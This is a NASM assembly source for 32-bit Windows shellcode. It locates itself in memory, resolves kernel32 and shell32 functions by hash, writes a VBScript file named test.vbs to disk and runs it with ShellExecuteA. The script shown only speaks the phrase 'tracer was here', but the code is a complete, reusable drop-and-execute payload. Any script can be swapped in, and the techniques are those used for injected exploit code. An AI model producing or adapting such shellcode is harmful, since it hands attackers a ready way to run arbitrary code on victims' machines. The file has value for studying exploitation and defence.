BITS 32

KERNEL32_HASH                       equ 0x000d4e88
KERNEL32_LOADLIBRARYA               equ 0x000d5786
KERNEL32_CREATEFILEA                equ 0x00067746
KERNEL32_WRITEFILE                  equ 0x0001ca42
KERNEL32_CLOSEHANDLE                equ 0x00067e1a
SHELL32_HASH                        equ 0x0006db88
SHELL32_SHELLEXECUTEA               equ 0x001b63e6

    call geteip
geteip:
    pop ebx
    
    push    ebp                     ; wouldn't normally bother with a stack frame, but
    mov     ebp, esp                ; we need ebp to mean something since we're 
    sub     esp, 8                  ; using it to reference local variables
    
    push    KERNEL32_LOADLIBRARYA
    push    KERNEL32_HASH
    call    GetFunction
    
    lea     esi, [SHELL32 - geteip + ebx]
    push    esi                 ; LPCTSTR lpFileName
    call    eax
    
    push    KERNEL32_CREATEFILEA
    push    KERNEL32_HASH
    call    GetFunction

    push    dword 0             ; HANDLE hTemplateFile
    push    dword 0x80          ; DWORD dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    push    dword 2             ; DWORD dwCreationDisposition = CREATE_ALWAYS  
    push    dword 0             ; LPSECURITY_ATTRIBUTES lpSecurityAttributes
    push    dword 0             ; DWORD dwShareMode
    push    dword 0x40000000    ; DWORD dwDesiredAccess = GENERIC_WRITE
    lea     esi, [FILENAME - geteip + ebx]
    push    esi                 ; LPCTSTR lpFileName
    call    eax
    
    mov     [ebp - 4], eax      ; save our file handle
    
    push    KERNEL32_WRITEFILE
    push    KERNEL32_HASH
    call    GetFunction
    
    mov     ecx, ebp
    sub     ecx, 8              ; pointer to our lpNumberOfBytesWritten

    push    dword 0             ; LPOVERLAPPED lpOverlapped
    push    ecx                 ; LPDWORD lpNumberOfBytesWritten
    push    dword 51            ; DWORD nNumberOfBytesToWrite
    lea     esi, [SCRIPT - geteip + ebx]
    push    esi                 ; LPCVOID lpBuffer
    push    dword [ebp - 4]     ; HANDLE hFile
    call    eax
    
    push    KERNEL32_CLOSEHANDLE
    push    KERNEL32_HASH
    call    GetFunction
    
    push    dword [ebp - 4]     ; HANDLE hObject
    call    eax

    push    SHELL32_SHELLEXECUTEA
    push    SHELL32_HASH
    call    GetFunction
    
    push    dword 0             ; INT nShowCmd
    push    dword 0             ; LPCTSTR lpDirectory
    push    dword 0             ; LPCTSTR lpParameters
    lea     esi, [FILENAME - geteip + ebx]
    push    esi                 ; LPCTSTR lpFile
    push    dword 0             ; LPCTSTR lpOperation
    push    dword 0             ; HWND hwnd      
    call    eax
    
    mov     esp, ebp
    pop     ebp
    ret
    
SHELL32:    db 'shell32.dll', 0
FILENAME:   db 'test.vbs', 0
SCRIPT:     db 'CreateObject("SAPI.SpVoice").Speak"tracer was here"', 0

%include 'load_win32.asm'